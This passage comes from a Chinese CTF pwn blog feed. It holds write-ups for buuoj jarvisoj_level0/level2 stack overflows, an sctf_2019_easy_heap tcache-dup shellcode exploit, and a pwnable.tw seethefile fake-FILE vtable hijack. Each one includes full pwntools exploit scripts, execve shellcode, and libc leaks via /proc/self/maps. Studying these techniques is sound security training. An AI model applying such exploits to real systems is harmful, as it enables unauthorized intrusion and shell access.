<p>​	第二种比第一种稍微复杂了一些，虽然有<code>system</code>函数但是参数不是我们想要的 ，而在程序的其他地方也能找到<code>/bin/sh</code>字符串。这时就需要利用一些<code>gadget</code>给<code>system</code>函数传参。而64位程序和32位程序二者的传参方式也不同。</p>
<h3 id="64位程序和32位程序在函数传参上的不同"><a href="#64位程序和32位程序在函数传参上的不同" class="headerlink" title="64位程序和32位程序在函数传参上的不同"></a>64位程序和32位程序在函数传参上的不同</h3><p>​	32位程序函数传参时，使用栈来传递参数（如<code>_cdecl</code>和<code>_stdcall</code>），参数从右往左压入栈，然后执行<code>call</code>指令跳转到要执行的函数的位置。因此我们攻击时只需构造一个栈结构即可。</p>
<p>​	64位程序函数传参时，先使用寄存器来存储参数，一共有6个存放参数的寄存器分别为<code>rdi,rsi,rdx,rcx,r8,r9</code>，当参数大于6个时多余的参数才通过栈传递。</p>
<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a><code>gadget</code></h3><p>​	<code>gadget</code>通常是以<code>ret</code>结尾的指令序列，如<code>pop rdi ; ret</code>，用于设置寄存器的值。在这里，我们用<code>pop rdi ; ret</code>把<code>/bin/sh</code>放入<code>rdi</code>寄存器中。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题1：buu-jarvisoj-level0"><a href="#例题1：buu-jarvisoj-level0" class="headerlink" title="例题1：buu  jarvisoj_level0"></a><strong>例题1</strong>：<code>buu</code>  <code>jarvisoj_level0</code></h3><p>拿到题目后先<code>checksec level0</code>命令检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>（堆栈不执行）保护。该程序为64位。</p>
<blockquote>
<p>​	<strong><code>canary</code>保护：函数开始执行的时候会先往栈里插入<code>canary</code>值，当函数真正返回的时候会验证<code>canary</code>值是否合法，如果不合法就停止程序运行。可以防止栈溢出覆盖返回地址。</strong></p>
</blockquote>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359646.png" alt="image-20231207130909272" style="zoom:80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359254.png" alt="image-20231207131026174"></p>
<p>定义数组<code>buf[128]</code>,<code>read</code>函数读取，且<code>0x200uLL</code>大于128，可以栈溢出。通过下图</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359093.png" alt="image-20231207131620028"></p>
<p>计算偏移量，为0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359586.png" alt="image-20231207131114573"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001740.png" alt="image-20231207131155073"></p>
<p>该题是第一种类型，直接溢出并劫持返回地址为<code>system</code>函数地址0x400596，即可。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359141.png" alt="image-20231207132517025"></p>
<p>最后<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27059</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359026.png" alt="image-20231207132411895"></p>
<h3 id="例题2：buu-jarvisoj-level2-x64"><a href="#例题2：buu-jarvisoj-level2-x64" class="headerlink" title="例题2：buu  jarvisoj_level2_x64"></a>例题2：<code>buu</code>  <code>jarvisoj_level2_x64</code></h3><p>拿到题目后先检查一下保护，<code>PIE</code>和<code>canary</code>都没开，开了<code>NX</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503132359564.png" alt="image-20231207111803128"></p>
<p>把题目放入<code>ida</code>里，查看</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000446.png" alt="image-20231207113118006" style="zoom: 80%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000356.png" alt="image-20231207113230907"></p>
<p>定义了一个数组<code>buf[128]</code>，有<code>read</code>函数<code>0x200uLL</code>明显大于128，可以栈溢出。计算偏移量，为0x80+8</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000814.png" alt="image-20231207121308672"></p>
<p>有<code>system</code>函数还是两个，但是参数都不是我们想要的。再查看一下字符串(<code>shift+F12</code>)</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000093.png" alt="image-20231207113459891"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000599.png" alt="image-20231207113617885"></p>
<p>很好，有<code>/bin/sh</code>点进去查看地址，为0x600a90，随便选一个<code>system</code>的地址为0x400603</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000124.png" alt="image-20231207115950982"></p>
<p>我们要做的就是通过<code>pop rdi;ret</code>把<code>/bin/sh</code>传参给<code>system</code>函数，通过<code>ROPgadget --binary level2_x64 | grep &quot;pop rdi&quot;</code>命令得到<code>pop rdi ; ret</code>地址，如下</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000948.png" alt="image-20231207120209890"></p>
<p>最后<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x400603</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006b3</span></span><br><span class="line">bin_addr = <span class="number">0x600a90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi_addr)+p64(bin_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#按顺序写入，为什么是这个顺序我也不知道</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop rdi控制第一个参数，ret衔接下一条指令</span></span><br><span class="line"><span class="comment">#pop rdi把bin_addr这个地址弹到了rdi寄存器中，ret执行触发system_addr</span></span><br><span class="line"><span class="comment">#调试一下看的很清楚，这也不知道，那也不知道，你知道啥，你这不知道  这题就不算弄懂了，不要得过且过</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000641.png" alt="image-20231207120706744"></p>
<h3 id="例题3：buu-jarvisoj-level2"><a href="#例题3：buu-jarvisoj-level2" class="headerlink" title="例题3：buu  jarvisoj_level2"></a>例题3：<code>buu</code>  <code>jarvisoj_level2</code></h3><p>前面几步都同上，我就不再多说。</p>
<p>如下，<code>system</code>的地址0x0804849e，偏移量0x88+4</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140000611.png" alt="image-20231207193202760"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001200.png" alt="image-20231207193238143"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231207193505701](https://raw.githubusercontent.com/Qwen11/picture/main/202503140001790.png)</span><br><span class="line"></span><br><span class="line">最后```exp```</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,28486)</span><br><span class="line"></span><br><span class="line">system_addr = 0x0804849e</span><br><span class="line">shell_addr = 0x0804a024</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88+4)+p32(system_addr)+p32(8)+p32(shell_addr)</span><br><span class="line">#payload = b&#x27;a&#x27;*(0x88)+p32(0xffffe000)+p32(system_addr)+p32(0xffffe000)+p32(shell_addr)</span><br><span class="line">#因为这个p32(8)的位置是你调用system函数的返回地址，也就是system函数执行后要执行的地址。而system函数执行了命令/bin/sh后会开启一个子进程阻塞当前的进程，所以system函数不会返回，这个地址8也就不会被跳转，这里你可以换成任意一个值都能成功，也就解释了为什么写了一个非法地址但程序不会崩溃 ，因为system压根就没返回</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>flag</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503140001116.png" alt="image-20231207193934134"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>sctf_2019_easy_heap</title>
    <url>/2024/07/30/sctf-2019-easy-heap/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="布置-shellcode"><a href="#布置-shellcode" class="headerlink" title="布置_shellcode_"></a>布置_shellcode_</h3><h4 id="合并-chunk"><a href="#合并-chunk" class="headerlink" title="合并_chunk_"></a>合并_chunk_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252046368.png" alt="image-20240730104958219" style="zoom:67%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>释放_chunk3_，并向上合并_chunk1_，_chunk2_，如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252046998.png" alt="image-20240730105355195" style="zoom:67%;" />

<h4 id="实现-bss-有相同指针"><a href="#实现-bss-有相同指针" class="headerlink" title="实现_.bss_有相同指针"></a>实现_.bss_有相同指针</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x4f0</span>)</span><br></pre></td></tr></table></figure>

<p>从_unstored bin_中回收_chunk0_，使_chunk1_,<em>chunk2</em>,<em>chunk3_合并后的_0x580_chunk_，被放到_unstored bin_中。此时</em>.bss_段的_chunk1_，_chunk2_指针依然存在，如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252046318.png" alt="image-20240730105404811" style="zoom:67%;" />

<p><em>chunk_实际已经在_bins_中了，但是</em>.bss_段依然有其指针。说明什么？说明可以使_.bss_段有相同的_chunk_hook_，进而就可以_tcachebin dup_。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br></pre></td></tr></table></figure>

<p>从_bins_中回收_chunk1_，<em>chunk2_的指针，</em>.bss_段有两个相同的指针，两组，如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252046087.png" alt="image-20240730110314617" style="zoom:67%;" />

<h4 id="实现-tcachebin-dup"><a href="#实现-tcachebin-dup" class="headerlink" title="实现_tcachebin dup_"></a>实现_tcachebin dup_</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p>实现_tcachebin dup_，_tcachebins_中有两张指向自己的指针，如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252045658.png" alt="image-20240730110432432" style="zoom: 67%;" />

<h4 id="布置-shellcode-1"><a href="#布置-shellcode-1" class="headerlink" title="布置_shellcode_"></a>布置_shellcode_</h4><p>接下来就是利用_tcachebin dup_，把_shellcode_写到，程序在最开始_mmap_的一块内存中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">payload = p64(mmap_addr)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">paylaod = shellcode+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure>

<h3 id="覆盖-malloc-hook-为-shellcode-addr"><a href="#覆盖-malloc-hook-为-shellcode-addr" class="headerlink" title="覆盖___malloc_hook_为_shellcode_addr_"></a>覆盖___malloc_hook_为_shellcode_addr_</h3><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./sctf_2019_easy_heap&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27376</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xC9D</span>)<span class="comment">#0xC85,0xC91,</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Pointer Address &#x27;</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)    </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">mmap_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;mmap_addr&quot;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x4f0</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(mmap_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">3</span>,shellcode+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x580</span>))</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x520</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;\x30&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(mmap_addr)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn刷题记录</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-seethefile</title>
    <url>/2024/08/13/seethefile/</url>
    <content><![CDATA[<p>第一次做iofile类型的题目，也花了不少时间去学习，照例记录一下吧。</p>
<span id="more"></span>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>程序大致内容是，打开指定的文件，读出数据，打印出来，不能打开名为_flag_的文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>

<p><code>switch(5)</code>时，往<em>name</em>中输入数据时，有一个溢出漏洞。如下，<em>name</em>在*.bss<em>段，而<code>fp</code>就在</em>name<em>下方<code>0x20</code>个字节处，故我们可以溢出</em>name*覆盖<code>fp</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o</span><br><span class="line">.bss:0804B260                                         ; main+B4↑o</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</span><br><span class="line">.bss:0804B280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:0804B280 _bss            ends</span><br><span class="line">.bss:0804B280</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏<em>libc</em></h3><p>​	由于可以读取指定文件的数据，故可以直接利用<em>linux</em>的<em>proc</em>伪文件系统，读取<code>/proc/self/maps</code>即可获得libc基址。不过一次只能读取<code>0x18</code>字节，可能要多读取几次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="构造-fake-file"><a href="#构造-fake-file" class="headerlink" title="构造_fake_file"></a>构造<code>_fake_file</code></h3><p><code>32</code>位里<code>file</code>到<code>vtable</code>的偏移为<code>0x94</code>，对于伪造<code>file</code>，有如下解释：</p>
<ul>
<li>偏移为<code>0</code>处设置为<code>0xffffdfff</code></li>
<li>偏移为<code>4</code>处设置为要执行的指令字符串</li>
<li>然后用垃圾字节填充至<code>vtable</code>处</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span>   <span class="comment">#p区域的首地址是0x804b284</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)   <span class="comment">#fp指向p区域</span></span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line"><span class="comment">#在p区域设置size为0x94字节的file(_IO_FILE	file;)</span></span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line"><span class="comment">#覆盖vtable为system_addr的地址</span></span><br><span class="line">exit_with_name(payload)</span><br></pre></td></tr></table></figure>

<p>本题给的<em>libc</em>版本为<code>2.23</code>,<code>libc2.24</code>以下的版本没有对虚表进行检查，所以直接伪造即可。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h2><h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="number">0x804b280</span>+<span class="number">0x4</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_FILE)</span><br><span class="line">payload+= p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x94</span>-<span class="number">0x4</span>-<span class="number">0x3</span>)</span><br><span class="line">payload+= p32(fake_FILE+<span class="number">0x90</span>)+p32(system_addr)</span><br><span class="line">exit_with_name(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./seethefile&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10200</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/home/wen/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit_with_name</span>(<span class="params">name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Leave your name :&quot;</span>,name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line"><span class="comment"># readfile()</span></span><br><span class="line"><span class="comment"># writefile()</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[heap]\n&#x27;</span>)</span><br><span class="line">libc_base = <span 